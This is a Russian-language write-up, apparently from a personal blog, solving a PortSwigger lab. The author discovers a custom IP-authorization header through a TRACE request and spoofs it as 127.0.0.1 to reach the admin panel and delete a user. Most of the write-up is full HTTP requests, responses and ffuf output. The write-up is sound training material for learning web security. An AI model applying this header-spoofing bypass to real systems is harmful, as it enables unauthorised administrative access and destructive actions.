---
title: "Authentication bypass via information disclosure"
date: 2025-07-10
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass"
classes: wide
---

В данной лабораторной работе можно обойти аутентификацию к личному кабинету администратора, но для этого нужно получить кастомный заголовок `HTTP` запроса через отладочные методы `HTTP`-запросов.

Для решения нужно получить доступ к личному кабинету пользователя `carlos` и удалить его аккаунт. Для входа в свою учетку можно использовать данные `wiener`:`peter`.

```
https://0a78001904697f8084f3b89b00cf002d.web-security-academy.net/
```

##  Solution

Зайду в ЛК:

```http
POST /login HTTP/2
Host: 0a78001904697f8084f3b89b00cf002d.web-security-academy.net
Cookie: session=Wl0WMu2OX3zIEymsSIJfaM8GBCOPEird
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad4004904fa068f811034cd00bb0086.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://0ad4004904fa068f811034cd00bb0086.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=MHHhXRJRIhF8IQ5FrMxo82QhJIgCsybx&username=wiener&password=peter
```

Пока ничего интересного не вижу. Поищу ручки с помощью [ffuf](https://cu63.github.io/tools/ffuf/):

```bash
cu63:~/ $ ffuf -u https://0ad4004904fa068f811034cd00bb0086.web-security-academy.net/FUZZ -w ~/wordlists/common.txt                                      
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://0ad4004904fa068f811034cd00bb0086.web-security-academy.net/FUZZ
 :: Wordlist         : FUZZ: /Users/cu63/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

Admin                   [Status: 401, Size: 2592, Words: 1044, Lines: 54, Duration: 61ms]
ADMIN                   [Status: 401, Size: 2592, Words: 1044, Lines: 54, Duration: 66ms]
Login                   [Status: 200, Size: 3185, Words: 1313, Lines: 64, Duration: 62ms]
admin                   [Status: 401, Size: 2592, Words: 1044, Lines: 54, Duration: 64ms]
analytics               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
favicon.ico             [Status: 200, Size: 15406, Words: 11, Lines: 1, Duration: 68ms]
filter                  [Status: 200, Size: 10743, Words: 5064, Lines: 199, Duration: 80ms]
login                   [Status: 200, Size: 3185, Words: 1313, Lines: 64, Duration: 65ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 63ms]
my-account              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 62ms]
:: Progress: [4686/4686] :: Job [1/1] :: 37 req/sec :: Duration: [0:01:29] :: Errors: 0 ::
```

Хмм... Будто бы мне на что-то намекают. Пойду смотреть этих ваших админов) Выдало ошибку:

```
Admin interface only available to local users 
```

Закину запрос в `Repeater` и попробую изменить `GET` на `OPTIONS`:

```http
HTTP/2 405 Method Not Allowed
Allow: GET, POST
Content-Type: application/json; charset=utf-8
Set-Cookie: session=46hsgkj2fGn2rQC2m7HDAU5Bj5RM1AgR; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

Пока безуспешно. Может быть `TRACE`? Этот метод используется для отладки. Сервер должен нам отравить полученный пакет обратно:

```http
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 682

TRACE /login HTTP/1.1
Host: 0a78001904697f8084f3b89b00cf002d.web-security-academy.net
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
accept-language: en-US,en;q=0.5
accept-encoding: gzip, deflate, br
referer: https://0a78001904697f8084f3b89b00cf002d.web-security-academy.net/
upgrade-insecure-requests: 1
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
priority: u=0, i
te: trailers
cookie: session=F4pNxow1kvc4kNvojK2id2aDac4svg4e
Content-Length: 0
X-Custom-IP-Authorization: 91.233.170.191
```

Вот этот параметр выглядит больно подозрительно: `X-Custom-IP-Authorization: 91.233.170.191`. Попробую заменить его на `localhost`:

```http
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 677

TRACE /login HTTP/1.1
Host: 0a78001904697f8084f3b89b00cf002d.web-security-academy.net
user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
accept-language: en-US,en;q=0.5
accept-encoding: gzip, deflate, br
referer: https://0a78001904697f8084f3b89b00cf002d.web-security-academy.net/
upgrade-insecure-requests: 1
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
priority: u=0, i
te: trailers
x-custom-ip-authorization: 127.0.0.1
cookie: session=F4pNxow1kvc4kNvojK2id2aDac4svg4e
Content-Length: 0
```

Сработало. Мое значение не перетерлось. Подставлю его в `GET`-запрос к странице админа:

```http
GET /admin HTTP/2
Host: 0a78001904697f8084f3b89b00cf002d.web-security-academy.net
Cookie: session=F4pNxow1kvc4kNvojK2id2aDac4svg4e
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a78001904697f8084f3b89b00cf002d.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Custom-Ip-Authorization: 127.0.0.1
```

Получилось)

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Authentication_bypass_via_information_disclosure/1.png){: height="200" .align-center}

Для удобства сделаю это в браузере. Для этого нажму правой кнопкой мыши на мой запрос и выберу пункт `Show response in browser`. Теперь удалю пользователя, включив проки, чтобы подставить нужное значение:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a78001904697f8084f3b89b00cf002d.web-security-academy.net
Cookie: session=lxk7eSbUwQylN3FVHqgQ6Np18IyXaYvk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a78001904697f8084f3b89b00cf002d.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Custom-Ip-Authorization: 127.0.0.1
```

Пользователь удален, а значит лаба решена.

![IMG](/assets/images/PortSwigger/IMG_information_disclosure/IMG_Authentication_bypass_via_information_disclosure/2.png){: height="200" .align-center}
